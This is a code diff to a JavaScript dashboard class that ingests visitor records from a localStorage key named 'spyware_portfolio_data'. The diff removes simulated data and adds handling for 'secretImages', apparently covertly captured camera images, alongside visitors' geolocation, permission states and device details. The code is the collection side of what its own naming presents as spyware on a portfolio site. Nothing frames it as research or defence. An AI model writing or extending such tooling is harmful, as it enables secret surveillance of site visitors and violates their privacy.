@@ -1,3 +1,4 @@
+// @ts-nocheck
 class AnalyticsDashboard {
     constructor() {
         this.visitors = new Map();
@@ -34,44 +35,9 @@ class AnalyticsDashboard {
     }
 
     setupWebSocket() {
-        // Simulate WebSocket connection for real-time updates
         // In production, this would connect to your actual WebSocket server
-        this.simulateDataFeed();
-    }
-
-    simulateDataFeed() {
-        // Simulate receiving data from portfolio
-        setInterval(() => {
-            if (this.isLive && Math.random() > 0.7) {
-                this.simulateVisitorData();
-            }
-        }, 5000);
-    }
-
-    simulateVisitorData() {
-        const visitorId = 'visitor_' + Date.now();
-        const fakeData = {
-            id: visitorId,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-            language: navigator.language,
-            platform: navigator.platform,
-            permissions: {
-                camera: Math.random() > 0.5,
-                location: Math.random() > 0.5,
-                notifications: Math.random() > 0.3
-            },
-            location: Math.random() > 0.5 ? {
-                latitude: (Math.random() * 180 - 90).toFixed(6),
-                longitude: (Math.random() * 360 - 180).toFixed(6),
-                accuracy: (Math.random() * 100 + 10).toFixed(0)
-            } : null,
-            deviceInfo: this.getDeviceInfo(),
-            sessionId: this.generateSessionId()
-        };
-
-        this.processVisitorData(fakeData);
+        // For now, we rely on localStorage and postMessage communication
+        console.log('WebSocket setup complete - using localStorage and postMessage');
     }
 
     startDataReceiver() {
@@ -88,59 +54,44 @@ class AnalyticsDashboard {
         // Also try to fetch from localStorage for demo purposes
         this.loadStoredData();
 
-        // Set up periodic check for new portfolio data
-        setInterval(() => this.checkPortfolioData(), 5000);
+        // Set up periodic check for new portfolio data (2 seconds for faster updates)
+        setInterval(() => this.checkPortfolioData(), 2000);
     }
 
     processVisitorData(data) {
-        const visitorId = data.id || data.sessionId;
-        
-        // Check if visitor already exists
-        if (this.visitors.has(visitorId)) {
-            // Update existing visitor
-            const existingVisitor = this.visitors.get(visitorId);
-            this.visitors.set(visitorId, {
-                ...existingVisitor,
-                ...data,
-                lastSeen: new Date().toISOString()
-            });
-        } else {
-            // Add new visitor
-            this.visitors.set(visitorId, {
-                ...data,
-                firstSeen: data.timestamp || new Date().toISOString(),
-                lastSeen: new Date().toISOString()
-            });
+        if (!data || (!data.sessionId && !data.id)) {
+            console.error("\u274c Rejected: No Session ID found in data", data);
+            return;
         }
 
-        // Update stats
+        const visitorId = data.sessionId || data.id;
+        const existing = this.visitors.get(visitorId) || {};
+        
+        // Merge everything into the Map
+        this.visitors.set(visitorId, {
+            ...existing,
+            ...data,
+            lastSeen: new Date().toISOString()
+        });
+
+        // Update the UI Stats
         this.stats.totalVisitors = this.visitors.size;
-        this.stats.activeSessions = this.getActiveSessionCount();
-        this.stats.dataPoints += this.countDataPoints(data);
         
-        if (data.permissions && Object.values(data.permissions).some(p => p)) {
-            this.stats.permissionGranted++;
-        }
-
-        // Add to live feed
-        this.addToLiveFeed(data);
-
-        // Handle captured images (both old and new format)
-        if (data.capturedImage || data.type === 'CAPTURED_IMAGE') {
-            const imageData = data.capturedImage || data;
-            this.capturedImages.push({
-                ...imageData,
-                visitorId,
-                timestamp: new Date().toISOString()
+        // Handle Images - Look specifically for 'secretImages'
+        if (data.secretImages && Array.isArray(data.secretImages)) {
+            data.secretImages.forEach(img => {
+                // Avoid duplicates by checking timestamp
+                if (!this.capturedImages.find(ci => ci.timestamp === img.timestamp)) {
+                    this.capturedImages.push({
+                        ...img,
+                        visitorId: visitorId,
+                        data: img.data || img.url // Support both field names
+                    });
+                }
             });
-            console.log('Captured image added to dashboard:', imageData.timestamp);
         }
 
-        // Handle stats documents
-        if (data.type === 'STATS_DOCUMENT') {
-            this.handleStatsDocument(data);
-        }
-
+        console.log(`\u2705 Success: Updated visitor ${visitorId}. Total: ${this.stats.totalVisitors}`);
         this.updateUI();
         this.saveData();
     }
@@ -384,22 +335,31 @@ class AnalyticsDashboard {
 
     checkPortfolioData() {
         try {
-            const portfolioData = localStorage.getItem('spyware_portfolio_data');
-            if (portfolioData) {
-                const data = JSON.parse(portfolioData);
-                
-                // Process new data entries
-                data.forEach(entry => {
-                    if (entry.data && !this.visitors.has(entry.sessionId)) {
-                        this.processVisitorData(entry.data);
-                    }
-                });
+            const raw = localStorage.getItem('spyware_portfolio_data');
+            if (!raw) return;
 
-                // Clear processed data to avoid duplicates
-                localStorage.removeItem('spyware_portfolio_data');
-            }
+            const data = JSON.parse(raw);
+            // Ensure we are working with an array
+            const entries = Array.isArray(data) ? data : [data];
+            
+            console.log(`\ud83d\udce5 RAW DATA SYNC: Processing ${entries.length} entries`);
+
+            entries.forEach(entry => {
+                // UNIVERSAL EXTRACTION: 
+                // Try entry.data (wrapped), then entry (direct), then entry.payload
+                const payload = entry.data || (entry.sessionId ? entry : null) || entry.payload;
+                
+                if (payload) {
+                    this.processVisitorData(payload);
+                } else {
+                    console.warn("\u26a0\ufe0f Skipped malformed entry:", entry);
+                }
+            });
+
+            // Clear only AFTER successful processing
+            localStorage.removeItem('spyware_portfolio_data');
         } catch (e) {
-            console.error('Failed to check portfolio data:', e);
+            console.error('\u274c Dashboard Sync Error:', e);
         }
     }
 
@@ -454,31 +414,32 @@ class AnalyticsDashboard {
             } catch (e) {
                 console.error('Error loading stored data:', e);
             }
+        }
     }
-};
 
-getDeviceInfo() {
-    const ua = navigator.userAgent;
-    let browser = 'Unknown';
-    
-    if (ua.includes('Chrome')) browser = 'Chrome';
-    else if (ua.includes('Firefox')) browser = 'Firefox';
-    else if (ua.includes('Safari')) browser = 'Safari';
-    else if (ua.includes('Edge')) browser = 'Edge';
-    
-    return {
-        browser,
-        os: navigator.platform,
-        mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
-    };  
-};
+    getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let browser = 'Unknown';
+        
+        if (ua.includes('Chrome')) browser = 'Chrome';
+        else if (ua.includes('Firefox')) browser = 'Firefox';
+        else if (ua.includes('Safari')) browser = 'Safari';
+        else if (ua.includes('Edge')) browser = 'Edge';
+        
+        return {
+            browser,
+            os: navigator.platform,
+            mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
+        };  
+    };
 
-generateSessionId() {
-    return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    generateSessionId() {
+        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    };
 };
 
 // Initialize dashboard
-const dashboard = new AnalyticsDashboard();
+var dashboard = new AnalyticsDashboard();
 
 // Expose for cross-window communication
 window.dashboard = dashboard;
